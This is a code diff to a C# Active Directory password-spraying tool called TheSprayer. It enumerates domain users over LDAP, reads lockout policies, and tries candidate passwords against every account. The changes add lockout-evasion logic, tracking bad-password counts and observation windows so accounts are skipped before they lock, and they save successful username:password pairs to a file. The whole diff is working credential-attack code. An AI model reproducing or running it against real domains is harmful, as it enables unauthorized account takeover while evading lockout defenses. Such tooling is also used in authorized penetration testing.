@@ -85,7 +85,6 @@ namespace TheSprayer
             catch (Exception e)
             {
                 Console.WriteLine("\nUnexpected exception occured:\n\t{0}: {1}", e.GetType().Name, e.Message);
-                Console.WriteLine(_domainController + " " + _domainUser + " " + _domainUserPass + " " + _domain);
             }
 
             return policies;
@@ -132,7 +131,6 @@ namespace TheSprayer
             catch (Exception e)
             {
                 Console.WriteLine("\nUnexpected exception occured:\n\t{0}: {1}", e.GetType().Name, e.Message);
-                Console.WriteLine(_domainController + " " + _domainUser + " " + _domainUserPass + " " + _domain);
                 return null;
             }
         }
@@ -145,7 +143,7 @@ namespace TheSprayer
 
             int pageCount = 0;
             // Get specific attributes. There's a heap that aren't relevant and when there are tons of users it will lessen the load on the DC
-            string[] attributes = { "userPrincipalName", "sAMAccountName", "distinguishedName", "givenName", "sn", "description", "lastLogon", "badPwdCount", "logonCount", "pwdLastSet", "accountExpires", "createTimeStamp", "ADsPath", "company", "objectSid", "sIDHistory", "adminDescription", "msDS-ResultantPSO" };
+            string[] attributes = { "userPrincipalName", "sAMAccountName", "distinguishedName", "givenName", "sn", "description", "lastLogon", "badPwdCount", "badPasswordTime", "logonCount", "pwdLastSet", "accountExpires", "createTimeStamp", "ADsPath", "company", "objectSid", "sIDHistory", "adminDescription", "msDS-ResultantPSO" };
             // LDAP Filter to get all domain users. This needs to be modified but works for testing.
 
             string filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))";
@@ -198,6 +196,7 @@ namespace TheSprayer
                             Description = entry.Attributes.GetIfExists("description"),
                             LastLogin = entry.Attributes.GetIfExists<DateTime?>("lastLogon"),
                             BadPasswordAttempts = entry.Attributes.GetIfExists<int>("badPwdCount"),
+                            LastBadPasswordTime = entry.Attributes.GetIfExists<DateTime?>("badPasswordTime"),
                             LogonCount = entry.Attributes.GetIfExists<int>("logonCount"),
                             PasswordLastSet = entry.Attributes.GetIfExists<DateTime?>("pwdLastSet"),
                             AccountExpiry = entry.Attributes.GetIfExists<DateTime?>("accountExpires"),
@@ -215,66 +214,90 @@ namespace TheSprayer
             catch (Exception e)
             {
                 Console.WriteLine("\nUnexpected exception occured:\n\t{0}: {1}", e.GetType().Name, e.Message);
-                Console.WriteLine(_domainController + " " + _domainUser + " " + _domainUserPass + " " + _domain);
             }
 
             return adUsers;
         }
 
-        public void SprayPasswords(string[] passwords, int attemptsToLeave = 2)
+        public void SprayPasswords(string[] passwords, int attemptsToLeave = 2, string outputFile = null)
         {
             var defaultPasswordPolicy = GetPasswordPolicy();
             var fineGrainedPasswordPolicies = GetFineGrainedPasswordPolicy();
             var users = GetAllDomainUsers();
 
+            Console.WriteLine("Filtering disabled and nearly locked users");
+            List<ActiveDirectoryUser> filteredUsers = new();
+            foreach(var user in users)
+            {
+                if (!IsUserCloseToLockout(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
+                {
+                    filteredUsers.Add(user);
+                }
+            }
+
             foreach (var password in passwords)
             {
-                foreach (var user in users)
+                Console.WriteLine($"Trying password {password} against {filteredUsers.Count} users");
+                foreach (var user in filteredUsers.ToList())
                 {
-                    var shouldSpray = false;
-                    var policyName = user.PasswordPolicyName;
-                    PasswordPolicy policy;
-                    if (policyName == "Default Password Policy")
+                    if (TryValidateCredentials(user.SamAccountName, password, out var message))
                     {
-                        policy = defaultPasswordPolicy;
-                    }
-                    else
-                    {
-                        policy = fineGrainedPasswordPolicies.FirstOrDefault(p => p.Name == policyName);
-                    }
-
-                    if (policy == null) // Fine grained policy that we can't see :(
-                    {
-                        // Fine grained password policy detected but not readable, skipping user.
-                    }
-                    else if (policy.LockoutThreshold == 0) //We can go forever :D
-                    {
-                        // $"Spraying {user.SamAccountName}. No lockout limits."
-                        shouldSpray = true;
-                    }
-                    else
-                    {
-                        var remainingAttempts = policy.LockoutThreshold - user.BadPasswordAttempts;
-                        if (remainingAttempts >= attemptsToLeave)
+                        Console.WriteLine($"{user.SamAccountName}:{password}");
+                        if (!string.IsNullOrWhiteSpace(outputFile))
                         {
-                            //$"Spraying {user.SamAccountName}. Attempts before lockout: {remainingAttempts}"
-                            shouldSpray = true;
-                        }
-                        else
-                        {
-                            // User is too close to being locked, skipping.
+                            using var sw = System.IO.File.CreateText(outputFile);
+                            sw.WriteLine($"{user.SamAccountName}:{password}");
                         }
                     }
-
-                    if (shouldSpray)
+                    else //Increment users bad password attempts and remove if close to lockout
                     {
-                        if (TryValidateCredentials(user.SamAccountName, password, out var message))
+                        user.BadPasswordAttempts++;
+                        user.LastBadPasswordTime = DateTime.Now;
+                        if(IsUserCloseToLockout(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
                         {
-                            Console.WriteLine($"{user.SamAccountName}:{password}");
+                            filteredUsers.Remove(user);
                         }
                     }
                 }
             }
+        }
+
+        public bool IsUserCloseToLockout(ActiveDirectoryUser user, PasswordPolicy defaultPasswordPolicy, List<PasswordPolicy> fineGrainedPasswordPolicies, int attemptsToLeave = 2)
+        {
+            var policyName = user.PasswordPolicyName;
+            PasswordPolicy policy;
+            if (policyName == "Default Password Policy")
+            {
+                policy = defaultPasswordPolicy;
+            }
+            else
+            {
+                policy = fineGrainedPasswordPolicies.FirstOrDefault(p => p.Name == policyName);
+            }
+
+            if (policy == null) // Fine grained policy that we can't see :(
+            {
+                // Fine grained password policy detected but not readable, skipping user.
+            }
+            else if (policy.LockoutThreshold == 0) //We can go forever :D
+            {
+                // $"Spraying {user.SamAccountName}. No lockout limits."
+                return false;
+            }
+            else
+            {
+                var remainingAttempts = policy.LockoutThreshold - user.BadPasswordAttempts;
+                if (remainingAttempts >= attemptsToLeave || user.LastBadPasswordTime < DateTime.Now.AddMinutes(-1 * policy.ObservationWindow))
+                {
+                    //$"Spraying {user.SamAccountName}. Attempts before lockout: {remainingAttempts}"
+                    return false;
+                }
+                else
+                {
+                    // User is too close to being locked, skipping.
+                }
+            }
+            return true;
         }
 
         public bool TryValidateCredentials(string username, string password)
